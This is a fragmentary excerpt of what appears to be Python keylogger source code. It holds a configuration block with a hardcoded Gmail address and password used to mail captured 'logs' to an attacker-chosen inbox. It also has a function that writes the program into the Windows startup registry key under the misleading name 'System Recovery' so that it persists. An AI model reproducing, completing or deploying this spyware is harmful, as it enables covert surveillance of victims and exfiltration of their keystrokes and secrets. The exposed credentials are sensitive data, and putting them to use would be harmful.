...
yourgmail="pradagangmafiafwd@gmail.com"                                        #What is your gmail?
yourgmailpass="g0tr00t3d"                                    #What is your gmail password
sendto="pradaganglogs@gmail.com"                                           #Where should I send the logs to? (any email address)
...
def addStartup():  # this will add the file to the startup registry key
    ...
    SetValueEx(key2change, 'System Recovery', 0, REG_SZ,
               new_file_path)
